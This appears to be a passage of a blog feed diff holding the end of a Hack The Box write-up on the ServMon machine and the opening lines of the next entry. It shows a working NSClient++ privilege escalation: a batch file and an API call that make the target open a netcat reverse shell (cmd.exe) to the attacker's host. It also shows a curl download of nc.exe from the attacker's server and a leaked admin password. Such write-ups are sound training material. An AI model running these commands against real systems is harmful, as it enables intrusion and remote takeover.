+&lt;span class="code-line"&gt;        @echo off&lt;/span&gt;
+&lt;span class="code-line"&gt;        c:\temp\nc.exe 192.168.0.163 443 -e cmd.exe&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;4. Setup listener on attacking machine&lt;/span&gt;
+&lt;span class="code-line"&gt;        nc -nlvvp 443&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;5. Add script foobar to call evil.bat and save settings&lt;/span&gt;
+&lt;span class="code-line"&gt;- Settings &amp;gt; External Scripts &amp;gt; Scripts&lt;/span&gt;
+&lt;span class="code-line"&gt;- Add New&lt;/span&gt;
+&lt;span class="code-line"&gt;        - foobar&lt;/span&gt;
+&lt;span class="code-line"&gt;                command = c:\temp\evil.bat&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;6. Add schedulede to call script every 1 minute and save settings&lt;/span&gt;
+&lt;span class="code-line"&gt;- Settings &amp;gt; Scheduler &amp;gt; Schedules&lt;/span&gt;
+&lt;span class="code-line"&gt;- Add new&lt;/span&gt;
+&lt;span class="code-line"&gt;        - foobar&lt;/span&gt;
+&lt;span class="code-line"&gt;                interval = 1m&lt;/span&gt;
+&lt;span class="code-line"&gt;                command = foobar&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;7. Restart the computer and wait for the reverse shell on attacking machine&lt;/span&gt;
+&lt;span class="code-line"&gt;        nc -nlvvp 443&lt;/span&gt;
+&lt;span class="code-line"&gt;        listening on [any] 443 ...&lt;/span&gt;
+&lt;span class="code-line"&gt;        connect to [192.168.0.163] from (UNKNOWN) [192.168.0.117] 49671&lt;/span&gt;
+&lt;span class="code-line"&gt;        Microsoft Windows [Version 10.0.17134.753]&lt;/span&gt;
+&lt;span class="code-line"&gt;        (c) 2018 Microsoft Corporation. All rights reserved.&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        C:\Program Files\NSClient++&amp;gt;whoami&lt;/span&gt;
+&lt;span class="code-line"&gt;        whoami&lt;/span&gt;
+&lt;span class="code-line"&gt;        nt authority\system&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;First of all we get the password for the NSClient and the content of
+&lt;code&gt;nsclient.ini&lt;/code&gt; in order to see the access restriction. The application is only
+available from localhost.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;nadine@SERVMON C:\&amp;gt;cd &amp;quot;C:\Program Files\NSClient++&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;nadine@SERVMON C:\Program Files\NSClient++&amp;gt;nscp web -- password --display&lt;/span&gt;
+&lt;span class="code-line"&gt;Current password: ew2x6SsGTxjRwXOT&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;nadine@SERVMON C:\Program Files\NSClient++&amp;gt;type nsclient.ini&lt;/span&gt;
+&lt;span class="code-line"&gt;´╗┐# If you want to fill this file with all available options run the following command:&lt;/span&gt;
+&lt;span class="code-line"&gt;#   nscp settings --generate --add-defaults --load-all&lt;/span&gt;
+&lt;span class="code-line"&gt;# If you want to activate a module and bring in all its options use:&lt;/span&gt;
+&lt;span class="code-line"&gt;#   nscp settings --activate-module &amp;lt;MODULE NAME&amp;gt; --add-defaults&lt;/span&gt;
+&lt;span class="code-line"&gt;# For details run: nscp settings --help&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;; in flight - TODO&lt;/span&gt;
+&lt;span class="code-line"&gt;[/settings/default]&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;; Undocumented key&lt;/span&gt;
+&lt;span class="code-line"&gt;password = ew2x6SsGTxjRwXOT&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;; Undocumented key&lt;/span&gt;
+&lt;span class="code-line"&gt;allowed hosts = 127.0.0.1&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Then we upload &lt;code&gt;nc.exe&lt;/code&gt; from &lt;code&gt;/usr/share/windows-binaries&lt;/code&gt; using a python simple
+http server.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;nadine@SERVMON C:\Temp&amp;gt;curl http://10.10.14.200:8081/nc.exe -o nc.exe&lt;/span&gt;
+&lt;span class="code-line"&gt;  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current&lt;/span&gt;
+&lt;span class="code-line"&gt;                                Dload  Upload   Total   Spent    Left  Speed&lt;/span&gt;
+&lt;span class="code-line"&gt;100 59392  100 59392    0     0  59392      0  0:00:01 --:--:--  0:00:01  264k&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We know that the NSClient is only available from localhost. So we mount an SSH
+tunnel (&lt;code&gt;-D&lt;/code&gt; option) and use it as a socks proxy in our browser. Nevertheless
+the application is buggy and unstable from a web browser (either Firefox, Chromium or Chrome).&lt;/p&gt;
+&lt;p&gt;Therefore we use the &lt;a href="https://docs.nsclient.org/api/"&gt;NSClient API&lt;/a&gt; directly
+from our SSH connection (or we can use &lt;code&gt;proxychains&lt;/code&gt; with our SOCKS tunnel)
+in order to put a simple script that will call our netcat binary.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;nadine@SERVMON C:\Temp&amp;gt;curl -s -k -u admin -X PUT https://localhost:8443/api/v1/scripts/ext/scripts/me.bat --data-binary &amp;quot;C:\Temp\nc.exe 10.10.14.200 443 -e cmd.exe&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;Enter host password for user &amp;#39;admin&amp;#39;:&lt;/span&gt;
+&lt;span class="code-line"&gt;Added me as scripts\me.bat&lt;/span&gt;
+&lt;span class="code-line"&gt;nadine@SERVMON C:\Temp&amp;gt;curl -s -k -u admin https://localhost:8443/api/v1/queries&lt;/span&gt;
+&lt;span class="code-line"&gt;Enter host password for user &amp;#39;admin&amp;#39;:&lt;/span&gt;
+&lt;span class="code-line"&gt;[{&amp;quot;description&amp;quot;:&amp;quot;Check status of scheduled jobs.&amp;quot;,&amp;quot;metadata&amp;quot;:{},&amp;quot;name&amp;quot;:&amp;quot;check_tasksched&amp;quot;,&amp;quot;query_url&amp;quot;:&amp;quot;https://localhost:8443/api/v1/queries/check_tasksched/&amp;quot;,&amp;quot;title&amp;quot;:&amp;quot;check_tasksched&amp;quot;},{&amp;quot;description&amp;quot;:&amp;quot;Legacy version of check_tasksched&amp;quot;,&amp;quot;m&lt;/span&gt;
+&lt;span class="code-line"&gt;etadata&amp;quot;:{},&amp;quot;name&amp;quot;:&amp;quot;checktasksched&amp;quot;,&amp;quot;query_url&amp;quot;:&amp;quot;https://localhost:8443/api/v1/queries/checktasksched/&amp;quot;,&amp;quot;title&amp;quot;:&amp;quot;CheckTaskSched&amp;quot;},{&amp;quot;description&amp;quot;:&amp;quot;External script: scripts\\me.bat&amp;quot;,&amp;quot;metadata&amp;quot;:{},&amp;quot;name&amp;quot;:&amp;quot;me&amp;quot;,&amp;quot;query_url&amp;quot;:&amp;quot;https://localhost:8&lt;/span&gt;
+&lt;span class="code-line"&gt;443/api/v1/queries/me/&amp;quot;,&amp;quot;title&amp;quot;:&amp;quot;me&amp;quot;},{&amp;quot;description&amp;quot;:&amp;quot;External script: scripts\\rvsh.bat&amp;quot;,&amp;quot;metadata&amp;quot;:{},&amp;quot;name&amp;quot;:&amp;quot;rvsh&amp;quot;,&amp;quot;query_url&amp;quot;:&amp;quot;https://localhost:8443/api/v1/queries/rvsh/&amp;quot;,&amp;quot;title&amp;quot;:&amp;quot;rvsh&amp;quot;}]&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Then we run a listener on our box and at the same time we call our command. This
+give a shell as administrator on the box and we are able to retrieve the root
+flag.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;nadine@SERVMON C:\Temp&amp;gt;curl -s -k -u admin &amp;quot;https://localhost:8443/api/v1/queries/me/commands/execute?time=3m&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;Enter host password for user &amp;#39;admin&amp;#39;:&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;kali@kali:~/pown/htb_servmon/srv$ sudo nc -l -p 443&lt;/span&gt;
+&lt;span class="code-line"&gt;Microsoft Windows [Version 10.0.18363.752]&lt;/span&gt;
+&lt;span class="code-line"&gt;(c) 2019 Microsoft Corporation. All rights reserved.&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;C:\Program Files\NSClient++&amp;gt;type C:\Users\Administrator\Desktop\root.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;type C:\Users\Administrator\Desktop\root.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;f16c1d179c239f4ffe2ea0821759198b&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
+&lt;p&gt;What a pain. The box was really unstable on public servers. At the end the box
+is not really difficult.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="Windows"></category><category term="exploit"></category></entry><entry><title>HTB: Monteverde</title><link href="https://maggick.fr/2020/06/htb-monteverde.html" rel="alternate"></link><published>2020-06-15T09:00:00+02:00</published><updated>2020-06-15T09:00:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-06-15:/2020/06/htb-monteverde.html</id><summary type="html">&lt;p&gt;&lt;img alt="Craft card" class="align-left" src="/media/2020.06/monteverde_card.png" width="262"/&gt;&lt;/p&gt;
 &lt;p&gt;This is a writeup about a retired HacktheBox machine:
 &lt;a href="https://www.hackthebox.eu/home/machines/profile/223"&gt;Monteverde&lt;/a&gt; published on
 January the 11th 2020 by
